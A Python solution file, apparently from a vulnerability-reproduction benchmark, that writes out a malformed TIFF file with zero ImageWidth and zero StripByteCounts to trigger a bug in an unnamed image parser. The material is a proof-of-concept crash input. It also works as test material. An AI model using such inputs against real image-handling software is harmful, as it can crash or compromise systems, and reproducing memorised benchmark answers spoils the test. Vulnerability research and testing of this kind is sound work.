import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        def create_ifd_entry(tag: int, type: int, count: int, value: int) -> bytes:
            """
            Packs data into a 12-byte TIFF IFD entry structure.
            """
            entry = struct.pack('<HHL', tag, type, count)
            if type == 3:  # SHORT (2 bytes)
                value_bytes = struct.pack('<H', value) + b'\x00\x00'
            elif type == 4:  # LONG (4 bytes)
                value_bytes = struct.pack('<L', value)
            else:
                raise TypeError("Unsupported TIFF tag type")
            
            return entry + value_bytes

        # TIFF Header (8 bytes): Little-endian, version 42, IFD at offset 8
        header = b'II\x2a\x00\x08\x00\x00\x00'

        # IFD with 9 entries.
        num_entries = 9
        ifd_entry_count = struct.pack('<H', num_entries)

        # Image data (strip) is located after the IFD structure.
        # Offset = Header(8) + IFD_Count(2) + Entries(9 * 12) + Next_IFD_Offset(4)
        strip_offset = 8 + 2 + (num_entries * 12) + 4

        # Create the 9 IFD entries, sorted by tag ID.
        ifd_entries = b''
        # Tag 256: ImageWidth, Type LONG. Set to 0 to trigger the vulnerability.
        ifd_entries += create_ifd_entry(256, 4, 1, 0)
        # Tag 257: ImageLength, Type LONG. A non-zero value.
        ifd_entries += create_ifd_entry(257, 4, 1, 1)
        # Tag 258: BitsPerSample, Type SHORT. 8 for 8-bit grayscale.
        ifd_entries += create_ifd_entry(258, 3, 1, 8)
        # Tag 259: Compression, Type SHORT. 1 for no compression.
        ifd_entries += create_ifd_entry(259, 3, 1, 1)
        # Tag 262: PhotometricInterpretation, Type SHORT. 1 for BlackIsZero.
        ifd_entries += create_ifd_entry(262, 3, 1, 1)
        # Tag 273: StripOffsets, Type LONG. Offset to image data strip.
        ifd_entries += create_ifd_entry(273, 4, 1, strip_offset)
        # Tag 277: SamplesPerPixel, Type SHORT. 1 for a grayscale image.
        ifd_entries += create_ifd_entry(277, 3, 1, 1)
        # Tag 278: RowsPerStrip, Type SHORT. Image height is 1.
        ifd_entries += create_ifd_entry(278, 3, 1, 1)
        # Tag 279: StripByteCounts, Type LONG. Size of the strip. 0 because width is 0.
        ifd_entries += create_ifd_entry(279, 4, 1, 0)

        # End of IFD chain: a 4-byte null offset.
        next_ifd_offset = b'\x00\x00\x00\x00'

        # Assemble the final PoC file. No image data is needed.
        poc = header + ifd_entry_count + ifd_entries + next_ifd_offset

        return poc
